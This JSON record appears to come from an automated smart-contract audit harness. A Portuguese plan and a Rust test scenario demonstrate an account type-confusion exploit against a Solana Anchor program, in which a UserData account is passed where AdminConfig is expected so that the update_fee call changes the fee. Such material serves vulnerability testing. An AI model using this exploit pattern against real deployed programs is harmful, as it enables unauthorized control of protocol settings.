{
  "plan": "O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. O layout de AdminConfig e UserData e identico (Pubkey + u64), entao um atacante pode passar uma conta UserData no lugar de AdminConfig. O baseline chama update_fee com uma conta AdminConfig legitima (admin = authority) e deve ter sucesso. O ataque passa uma conta UserData cujo campo `authority` e o signer, e verifica se o fee (offset 40) foi alterado, demonstrando que o tipo errado foi aceito.",
  "scenario": "let authority = Pubkey::new_unique();

// Conta AdminConfig legitima: admin = authority, fee = 100
let admin_config_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let admin_config = account(&env.program_id, &admin_config_data, None);

// Conta UserData maliciosa: authority = authority (mesmo layout), balance = 999
let user_data_data = anchor_account_data("UserData", &(authority, 999u64));
let user_data = account(&env.program_id, &user_data_data, None);

// Baseline: uso legitimo com AdminConfig
let ix_baseline = env.anchor_ix(
    "update_fee",
    &(200u64,),
    vec![
        AccountMeta::new(admin_config.get_key(), false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (admin_config.get_key(), admin_config.clone()),
    (authority, wallet(1_000_000_000)),
];
let r_base = env.baseline("update_fee legitimo com AdminConfig", &ix_baseline, &contas_baseline);

// Ataque: passar UserData no lugar de AdminConfig
let ix_attack = env.anchor_ix(
    "update_fee",
    &(777u64,),
    vec![
        AccountMeta::new(user_data.get_key(), false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (user_data.get_key(), user_data.clone()),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com UserData no lugar de AdminConfig", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let fee_apos = read_u64(after(&r, &user_data.get_key()).data(), 40);
    env.effect("UserData aceita como AdminConfig: fee alterado para 777", fee_apos == 777u64);
}"
}

